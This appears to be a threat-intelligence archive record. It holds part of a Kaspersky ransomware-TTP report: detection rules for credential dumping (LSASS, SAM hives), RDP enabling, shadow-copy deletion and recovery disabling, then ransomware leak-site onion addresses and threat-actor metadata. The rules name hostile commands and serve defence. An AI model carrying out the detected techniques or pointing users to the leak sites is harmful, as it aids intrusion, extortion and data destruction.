‘\\vmtoolsd.exe’\n\n               - ‘\\vmware-updatemgr.exe’\n\n                - ‘\\ccsvchst.exe’\n\n                - ‘\\appdynamics.coordinator.exe’\n\n                - ‘\\symerr.exe’\n\n                - ‘\\google\\update\\googleupdate.exe’\n\n                - ‘\\microsoft\\edgeupdate\\microsoftedgeupdate.exe’\n\n                - ‘\\dropbox\\update\\dropboxupdate.exe’\n\n                - ‘\\websense\\websense endpoint\\wepsvc.exe’\n\n                - ‘\\zscaler\\zsatunnel\\zsatunnel.exe’\n\n                - ‘\\adobe\\adobegcclient\\agmservice.exe’\n\n                - ‘\\installflashplayer.exe’\n\n                - ‘\\flashplayerinstaller.exe’\n\n               - ‘\\adobearmhelper.exe’\n\n                - ‘\\adobearm.exe’\n\n                - ‘\\armsvc.exe’\n\n\n-----\n\n                - ‘\\kavfswp.exe’\n\n                - ‘\\kaspersky lab\\networkagent\\vapm.exe’\n\n                - ‘\\kaspersky lab\\kaspersky security center\\vapm.exe’\n\n                - ‘\\kaspersky lab\\networkagent\\kldumper.exe’\n\n                - ‘\\kaspersky lab\\networkagent\\klnagent.exe’\n\n                - ‘\\avp.exe’\n\n                - ‘\\kaspersky lab\\kaspersky endpoint security for windows\\\nkldw.exe’\n\n                - ‘\\kaspersky lab\\kaspersky endpoint security for windows\\\navpsus.exe’\n\n                - ‘\\cisco\\cisco anyconnect secure mobility client\\vpnagent.exe’\n```\n                  - ‘\\cisco\\cisco anyconnect secure mobility client\\\n\n```\nacwebsecagent.exe’\n\n                - ‘\\lenovo\\imcontroller\\service\\lenovo.modern.imcontroller.exe’\n\n                - ‘\\tensor company ltd\\sbis3plugin\\sbis3plugin.exe’\n\n                - ‘\\bitdefender\\endpoint security\\epupdateservice.exe’\n\n                - ‘\\bitdefender\\endpoint security\\epsecurityservice.exe’\n\n                - ‘\\teamviewer\\update\\update.exe’\n\n                - ‘\\tkauduservice64.exe’\n\n                - ‘\\ccm\\ccmexec.exe’\n\n                - ‘\\ccm\\sensorlogontask.exe’\n\n                - ‘\\collectguestlogs.exe’\n```\n          condition: selection and not whitelist\n\n```\nfalsepositives:\n\n         - Legitimate software accessing LSASS process for legitimate reason or\nwith excessive rights; update the whitelist with it\n```\n       level: high\n\n```\n\n-----\n\n```\n       title: Detected Access to SAM,SYSTEM and SECURITY registry hives\n\n```\ndescription: Detects SAM,SYSTEM and SECURITY registry hives accessing\nauthor: Kaspersky\n```\n       status: stable\n       tags:\n\n```\n         - attack.Credential _ Access\n          - attack.T1003.002\n          - attack.T1003.004\n          - attack.T1003.005\n         - attack.Discovery\n         - attack.T1012\n```\n       logsource:\n          product: windows\n       detection:\n          selection:\n\n```\nEventID:\n```\n              - 4663\n\n```\nObjectType: ‘key’\nObjectName|contains:\n            - ‘\\sam\\sam\\domains\\account\\users’\n             - ‘\\control\\lsa\\JD’\n             - ‘\\control\\lsa\\GBG’\n             - ‘\\control\\lsa\\Skew1’\n             - ‘\\control\\lsa\\Data’\n            - ‘\\security\\cache’\n            - ‘\\security\\policy\\secrets’\nfilter:\nProcessName:\n             - ‘c:\\windows\\system32\\services.exe’\n             - ‘c:\\windows\\system32\\lsass.exe’\ncondition: selection and not filter\nfalsepositives: -\n```\n       level: high\n\n```\n\n-----\n\n```\n       title: System Network Connections Discovery via Standard Windows Utilities\n\n```\ndescription: Detects system network connections discovery via standard windows\n```\n       utilities\n\n```\nauthor: Kaspersky\n```\n       status: stable\n       tags:\n\n```\n         - attack.Discovery\n\n          - attack.T1049\n```\n       logsource:\n          product: windows\n          category: process _ creation\n       detection:\n          selection1:\n\n```\nImage|endswith:\n             - ‘\\netstat.exe’\n```\n          selection2:\n\n```\nImage|endswith:\n             - ‘\\net.exe’\n             - ‘\\net1.exe’\n```\n          selection3:\n\n```\nCommandLine|contains:\n            - ‘session’\ncondition: selection1 or (selection2 and selection3)\nfalsepositives: Legitimate Administrator activity\n```\n       level: low\n       title: System Network Connections Discovery via PowerShell\n\n```\ndescription: Detects system network connections discovery via PowerShell\nauthor: Kaspersky\n```\n       status: stable\n       tags:\n\n```\n         - attack.Discovery\n\n          - attack.T1049\n\n         - attack.Execution\n\n          - attack.T1059.001\n```\n       logsource:\n          product: windows\n          category: process _ creation\n       detection:\n          selection1:\n\n```\nImage|endswith:\n            - ‘\\powershell.exe’\n             - ‘\\powershell _ ise.exe’\n```\n          selection2:\n\n```\nCommandLine|contains:\n            - ‘Get-NetTCPConnection’\n```\n          condition: selection1 and selection2\n\n```\nfalsepositives: Legitimate Administrator activity\n```\n       level: low\n\n```\n\n-----\n\n```\n       title: Enabling RDP via Registry\n\n```\ndescription: Detects registry modification to enable RDP\nauthor: Kaspersky\n```\n       status: stable\n       tags:\n\n```\n         - attack.Lateral _ Movement\n\n          - attack.T1021.001\n\n         - attack.Persistence\n\n         - attack.T1133\n\n         - attack.Defense _ Evasion\n\n         - attack.T1112\n```\n       logsource:\n          product: windows\n          category: registry _ event\n       detection:\n          selection:\n\n```\nEventType: SetValue\nTargetObject|endswith:\n\n                - ‘\\Control\\Terminal Server\\WinStations\\RDP-Tcp\\\nUserAuthentication’\n\n                - ‘\\Control\\Terminal Server\\fDenyTSConnections’\nDetails: ‘DWORD (0x00000000)’\n```\n          condition: selection\n\n```\nfalsepositives: Legitimate System Administrator actions\n```\n       level: high\n\n```\n\n-----\n\n```\n       title: Enabling RDP in Windows Firewall\n\n```\ndescription: Detects adding new firewall rule for enabling RDP\nauthor: Kaspersky\n```\n       status: stable\n       tags:\n\n```\n         - attack.Lateral _ Movement\n\n          - attack.T1021.001\n\n         - attack.Persistence\n\n         - attack.T1133\n\n         - attack.Defense _ Evasion\n\n         - attack.T1112\n```\n       logsource:\n          product: windows\n          category: process _ creation\n       detection:\n          selection:\n\n```\nImageName|endswith: ‘netsh.exe’\n```\n          selection2:\n\n```\n            - CommandLine|contains|all:\n\n               - ‘group=”remote desktop”’\n\n                - ‘enable=Yes’\n\n            - CommandLine|contains|all:\n\n               - ‘action=allow’\n\n               - ‘enable=yes’\n\n                - ‘port=3389’\n```\n          condition: selection and selection2\n\n```\nfalsepositives: -\n```\n       level: high\n\n```\n\n-----\n\n```\n       title: Shadow Copies Deletion\n\n```\ndescription: Detects deleting shadow copies or backups by system utilities\nauthor: Kaspersky\n```\n       status: stable\n       tags:\n\n```\n         - attack.Impact\n\n          - attack.T1490\n```\n       logsource:\n          product: windows\n          category: process _ creation\n       detection:\n          selection _ vssadmin1:\n\n```\nImage|endswith: ‘\\vssadmin.exe’\nCommandLine|contains|all:\n\n                - ‘delete’\n\n               - ‘shadows’\n```\n          selection _ vssadmin2:\n\n```\nImage|endswith: ‘\\vssadmin.exe’\n\n            - CommandLine|contains|all:\n\n                - ‘resize’\n\n               - ‘shadowstorage’\n```\n          selection _ wmic:\n\n```\nImage|endswith: ‘\\wmic.exe’\nCommandLine|contains|all:\n\n               - ‘shadow’\n\n                - ‘delete’\n```\n          selection _ powershell:\n\n```\nImage|endswith:\n\n                - ‘\\powershell.exe’\n\n                - ‘\\pwsh.exe’\nCommandLine|conatins|all:\n\n                - ‘Win32 _ Shadowcopy’\n\n                - ‘delete’\n```\n          selection _ wbadmin:\n\n```\nImage|endswith: ‘\\wbadmin.exe’\nCommandLine|contains: ‘delete’\nselection _ diskshadow:\nImage|endswith: ‘\\diskshadow.exe’\nCommandLine|contains|all:\n\n                - ‘delete’\n\n               - ‘shadows’\ncondition: 1 of them\nfalsepositives: Legitimate System Administrator actions\n```\n       level: high\n\n```\n\n-----\n\n```\n       title: Disable Automatic Windows Recovery\n\n```\ndescription: Detects disable automatic windows recovery via bcdedit\nauthor: Kaspersky\n```\n       status: stable\n       tags:\n\n```\n         - attack.Impact\n\n          - attack.T1490\n```\n       logsource:\n          product: windows\n          category: process _ creation\n       detection:\n          selection:\n\n```\nImage|endswith: ‘\\bcdedit.exe’\nCommandLine|contains|all:\n\n               - ‘recoveryenabled’\n\n               - ‘no’\n```\n          condition: selection\n\n```\nfalsepositives: Legitimate System Administrator actions\n```\n       level: high\n\n```\n\n-----\n\n## Appendix II – Additional URL with victim info\n\n|Actors|Site|\n|---|---|\n|BlackCat http://alphvmmm27o3abo3r2mlmjrpdmzle3rykajqc5xsj7j7ejksbpsa36ad[.]onion||\n|http://dlyo7r3n4qy5fzv4645nddjwarj7wjdd6wzckomcyc7akskkxp4glcad[.]onion Blackbyte http://f5uzduboq4fa2xkjloprmctk7ve3dm46ff7aniis66cbekakvksxgeqd[.]onion||\n|Clop http://santat7kpllt6iyvqbr7q4amdv6dzrh6paatvyrzl7ry3zm72zigf4ad[.]onion||\n|Conti http://continewsnv5otx5kaoje7krkto2qbu3gtqef22mnr7eaxw3y6ncz3ad[.]onion||\n|Hive http://hiveleakdbtnp76ulyhi52eag6c6tyc3xw7ez7iqy6wc34gd2nekazyd[.]onion||\n|Lockbit http://lockbitapt6vx57t3eeqjofwgcglmutr3a35nygvokja5uuccip4ykyd[.]onion||\n|Pysa http://pysa2bitc5ldeyfak4seeruqymqs4sj5wt5qkcq7aoyg4h2acqieywad[.]onion||\n|RagnarLocker http://rgleaktxuey67yrgspmhvtnrqtgogur35lwdrup4d3igtbm3pupc4lyd[.]onion||\n\n\nhttp://dlyo7r3n4qy5fzv4645nddjwarj7wjdd6wzckomcyc7akskkxp4glcad[.]onion\nBlackbyte\nhttp://f5uzduboq4fa2xkjloprmctk7ve3dm46ff7aniis66cbekakvksxgeqd[.]onion\n\nClop http://santat7kpllt6iyvqbr7q4amdv6dzrh6paatvyrzl7ry3zm72zigf4ad[.]onion\n\nConti http://continewsnv5otx5kaoje7krkto2qbu3gtqef22mnr7eaxw3y6ncz3ad[.]onion\n\nHive http://hiveleakdbtnp76ulyhi52eag6c6tyc3xw7ez7iqy6wc34gd2nekazyd[.]onion\n\nLockbit http://lockbitapt6vx57t3eeqjofwgcglmutr3a35nygvokja5uuccip4ykyd[.]onion\n\nPysa http://pysa2bitc5ldeyfak4seeruqymqs4sj5wt5qkcq7aoyg4h2acqieywad[.]onion\n\nRagnarLocker http://rgleaktxuey67yrgspmhvtnrqtgogur35lwdrup4d3igtbm3pupc4lyd[.]onion\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "bf5be533-fa31-4590-ae37-5761c97ffa34",
            "created_at": "2022-10-25T16:13:58.389257Z",
            "updated_at": "2022-10-25T16:13:58.389257Z",
            "deleted_at": null,
            "name": "Malpedia",
            "url": "https://malpedia.caad.fkie.fraunhofer.de",
            "description": "Malpedia is a free service offered by Fraunhofer FKIE",
            "reports": null
        }
    ],
    "references": [
        "https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2022/06/23093553/Common-TTPs-of-the-modern-ransomware_low-res.pdf"
    ],
    "report_names": [
        "Common-TTPs-of-the-modern-ransomware_low-res.pdf"
    ],
    "threat_actors": [
        {
            "id": "b740943a-da51-4133-855b-df29822531ea",
            "created_at": "2022-10-25T15:50:23.604126Z",
            "updated_at": "2025-03-27T02:00:55.505366Z",
            "deleted_at": null,
            "main_name": "Equation",
            "aliases": [
                "Equation"
            ],
            "source_name": "MITRE:Equation",
            "tools": null,
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "8670f370-1865-4264-9a1b-0dfe7617c329",
            "created_at": "2022-10-25T16:07:23.69953Z",
            "updated_at": "2025-03-27T02:02:09.929725Z",
            "deleted_at": null,
            "main_name": "Hades",
            "aliases": [
                "Operation TrickyMouse"
            ],
            "source_name": "ETDA:Hades",
            "tools": [
                "Brave Prince",
                "Gold Dragon",
                "GoldDragon",
                "Lovexxx",
                "Olympic Destroyer",
                "Running RAT",
                "RunningRAT",
                "SOURGRAPE",
                "running_rat"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "1bdb91cf-f1a6-4bed-8cfa-c7ea1b635ebd",
            "created_at": "2022-10-25T16:07:23.766784Z",
            "updated_at": "2025-03-27T02:02:09.971636Z",
            "deleted_at": null,
            "main_name": "Bluenoroff",
            "aliases": [
                "APT 38",
                "ATK 117",
                "Alluring Pisces",
                "Black Alicanto",
                "Bluenoroff",
                "CTG-6459",
                "Copernicium",
                "Nickel Gladstone",
                "Sapphire Sleet",
                "Selective Pisces",
                "Stardust Chollima",
                "T-APT-15",
                "TA444",
                "TAG-71",
                "TEMP.Hermit"
            ],
            "source_name": "ETDA:Bluenoroff",
            "tools": [],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "99cb4e5b-8071-4f9e-aa1d-45bfbb6197e3",
            "created_at": "2023-01-06T13:46:38.860754Z",
            "updated_at": "2025-03-27T02:00:02.937438Z",
            "deleted_at": null,
            "main_name": "TA505",
            "aliases": [
                "SectorJ04 Group",
                "Dudear",
                "G0092",
                "ATK103",
                "Hive0065",
                "Spandex Tempest",
                "GRACEFUL SPIDER",
                "GOLD TAHOE",
                "CHIMBORAZO",
                "SectorJ04"
            ],
            "source_name": "MISPGALAXY:TA505",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "f426f0a0-faef-4c0e-bcf8-88974116c9d0",
            "created_at": "2022-10-25T15:50:23.240383Z",
            "updated_at": "2025-03-27T02:00:55.404232Z",
            "deleted_at": null,
            "main_name": "APT38",
            "aliases": [
                "APT38",
                "NICKEL GLADSTONE",
                "BeagleBoyz",
                "Bluenoroff",
                "Stardust Chollima",
                "Sapphire Sleet",
                "COPERNICIUM"
            ],
            "source_name": "MITRE:APT38",
            "tools": [
                "ECCENTRICBANDWAGON",
                "HOPLIGHT",
                "Mimikatz",
                "KillDisk",
                "DarkComet"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "8bc1a044-a23b-4904-903c-13f463605cb3",
            "created_at": "2024-05-01T02:03:08.136237Z",
            "updated_at": "2025-03-27T02:05:17.415795Z",
            "deleted_at": null,
            "main_name": "NICKEL GLADSTONE",
            "aliases": [
                "Bluenoroff ",
                "CTG-6459 ",
                "Citrine Sleet ",
                "HIDDEN COBRA ",
                "Lazarus Group",
                "Sapphire Sleet ",
                "Stardust Chollima ",
                "APT38 "
            ],
            "source_name": "Secureworks:NICKEL GLADSTONE",
            "tools": [
                " Bankshot",
                " CATCH22",
                " CCGC_Proxy",
                " Cur1Agent",
                " Ratankba",
                " Server_TrafficForwarder",
                " Wcry",
                "AlphaNC"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "5e6b31a6-80e3-4e7d-8b0a-d94897ce9b59",
            "created_at": "2024-06-19T02:03:08.128175Z",
            "updated_at": "2025-03-27T02:05:17.400394Z",
            "deleted_at": null,
            "main_name": "GOLD TAHOE",
            "aliases": [
                "SectorJ04 ",
                "Spandex Tempest ",
                "TA505 ",
                "FIN11 "
            ],
            "source_name": "Secureworks:GOLD TAHOE",
            "tools": [
                " Cobalt Strike",
                " FlawedAmmy",
                " Get2",
                " GraceWire",
                " Malichus",
                " SDBbot",
                " ServHelper",
                " TrueBot",
                "Clop"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "4e453d66-9ecd-47d9-b63a-32fa5450f071",
            "created_at": "2024-06-19T02:03:08.077075Z",
            "updated_at": "2025-03-27T02:05:17.381141Z",
            "deleted_at": null,
            "main_name": "GOLD LOTUS",
            "aliases": [
                "Hecamede ",
                "BlackByte"
            ],
            "source_name": "Secureworks:GOLD LOTUS",
            "tools": [
                " Cobalt Strike",
                " ExByte",
                " MEGA",
                " RDP",
                " SoftPerfect Network Scanner",
                "BlackByte"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "a2b92056-9378-4749-926b-7e10c4500dac",
            "created_at": "2023-01-06T13:46:38.430595Z",
            "updated_at": "2025-03-27T02:00:02.831633Z",
            "deleted_at": null,
            "main_name": "Lazarus Group",
            "aliases": [
                "Operation DarkSeoul",
                "APT38",
                "ATK117",
                "DEV-1222",
                "G0032",
                "APT 38",
                "Stardust Chollima",
                "APT-C-26",
                "ATK3",
                "Diamond Sleet",
                "Hidden Cobra",
                "Unit 121",
                "Subgroup: Bluenoroff",
                "NICKEL GLADSTONE",
                "DEV-0139",
                "Andariel",
                "Operation Troy",
                "COVELLITE",
                "TA404",
                "Lazarus group",
                "Dark Seoul",
                "G0082",
                "NewRomanic Cyber Army Team",
                "Bluenoroff",
                "Appleworm",
                "Nickel Academy",
                "COPERNICIUM",
                "Hastati Group",
                "Bureau 121",
                "Operation AppleJeus",
                "Whois Hacking Team",
                "Citrine Sleet",
                "Sapphire Sleet",
                "Group 77",
                "Labyrinth Chollima",
                "Operation GhostSecret",
                "BeagleBoyz"
            ],
            "source_name": "MISPGALAXY:Lazarus Group",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "b69037ec-2605-4de4-bb32-a20d780a8406",
            "created_at": "2023-01-06T13:46:38.790766Z",
            "updated_at": "2025-03-27T02:00:02.919758Z",
            "deleted_at": null,
            "main_name": "MUSTANG PANDA",
            "aliases": [
                "TEMP.HEX",
                "TA416",
                "TANTALUM",
                "Twill Typhoon",
                "Earth Preta",
                "Stately Taurus",
                "LuminousMoth",
                "Polaris",
                "BRONZE PRESIDENT",
                "HoneyMyte",
                "Red Lich"
            ],
            "source_name": "MISPGALAXY:MUSTANG PANDA",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "75d4d6a9-b5d1-4087-a7a0-e4a9587c45f4",
            "created_at": "2022-10-25T15:50:23.5188Z",
            "updated_at": "2025-03-27T02:00:55.489882Z",
            "deleted_at": null,
            "main_name": "TA505",
            "aliases": [
                "TA505",
                "Hive0065",
                "Spandex Tempest",
                "CHIMBORAZO"
            ],
            "source_name": "MITRE:TA505",
            "tools": [
                "AdFind",
                "Azorult",
                "FlawedAmmyy",
                "Mimikatz",
                "Dridex",
                "TrickBot",
                "Get2",
                "FlawedGrace",
                "Cobalt Strike",
                "ServHelper",
                "Amadey",
                "SDBbot",
                "PowerSploit"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "e447d393-c259-46e2-9932-19be2ba67149",
            "created_at": "2022-10-25T16:07:24.28282Z",
            "updated_at": "2025-03-27T02:02:10.159466Z",
            "deleted_at": null,
            "main_name": "TA505",
            "aliases": [
                "ATK 103",
                "Chimborazo",
                "Gold Evergreen",
                "Gold Tahoe",
                "Graceful Spider",
                "Hive0065",
                "Operation Tovar",
                "Operation Trident Breach",
                "SectorJ04",
                "Spandex Tempest",
                "TA505",
                "TEMP.Warlock"
            ],
            "source_name": "ETDA:TA505",
            "tools": [
                "Amadey",
                "AmmyyRAT",
                "AndroMut",
                "Azer",
                "Bart",
                "Bugat v5",
                "CryptFile2",
                "CryptoLocker",
                "CryptoMix",
                "CryptoShield",
                "Dridex",
                "Dudear",
                "EmailStealer",
                "FRIENDSPEAK",
                "Fake Globe",
                "Fareit",
                "FlawedAmmyy",
                "FlawedGrace",
                "FlowerPippi",
                "GOZ",
                "GameOver Zeus",
                "GazGolder",
                "Gelup",
                "Get2",
                "GetandGo",
                "GlobeImposter",
                "Gorhax",
                "GraceWire",
                "Gussdoor",
                "Jaff",
                "Kasidet",
                "Kegotip",
                "Kneber",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "Locky",
                "MINEBRIDGE",
                "MINEBRIDGE RAT",
                "MirrorBlast",
                "Neutrino Bot",
                "Neutrino Exploit Kit",
                "P2P Zeus",
                "Peer-to-Peer Zeus",
                "Philadelphia",
                "Philadephia Ransom",
                "Pony Loader",
                "Rakhni",
                "ReflectiveGnome",
                "Remote Manipulator System",
                "RockLoader",
                "RuRAT",
                "SDBbot",
                "ServHelper",
                "Shifu",
                "Siplog",
                "TeslaGun",
                "TiniMet",
                "TinyMet",
                "Trojan.Zbot",
                "Wsnpoem",
                "Zbot",
                "Zeta",
                "ZeuS",
                "Zeus"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "d11c89bb-1640-45fa-8322-6f4e4053d7f3",
            "created_at": "2022-10-25T15:50:23.509601Z",
            "updated_at": "2025-03-27T02:00:55.487991Z",
            "deleted_at": null,
            "main_name": "Turla",
            "aliases": [
                "Turla",
                "IRON HUNTER",
                "Group 88",
                "Waterbug",
                "WhiteBear",
                "Krypton",
                "Venomous Bear",
                "Secret Blizzard",
                "BELUGASTURGEON"
            ],
            "source_name": "MITRE:Turla",
            "tools": [
                "PsExec",
                "nbtstat",
                "ComRAT",
                "netstat",
                "certutil",
                "KOPILUWAK",
                "IronNetInjector",
                "LunarWeb",
                "Arp",
                "Uroburos",
                "PowerStallion",
                "Kazuar",
                "Systeminfo",
                "LightNeuron",
                "Mimikatz",
                "Tasklist",
                "LunarMail",
                "HyperStack",
                "NBTscan",
                "TinyTurla",
                "Penquin",
                "LunarLoader"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1666716498,
    "ts_updated_at": 1743041737,
    "ts_creation_date": 1655987151,
    "ts_modification_date": 1655987151,
    "files": {
        "pdf": "https://archive.orkl.eu/87c9a5cf75a7afd57108d6dc7a495b3465257b5c.pdf",
        "text": "https://archive.orkl.eu/87c9a5cf75a7afd57108d6dc7a495b3465257b5c.txt",
        "img": "https://archive.orkl.eu/87c9a5cf75a7afd57108d6dc7a495b3465257b5c.jpg"
    }
}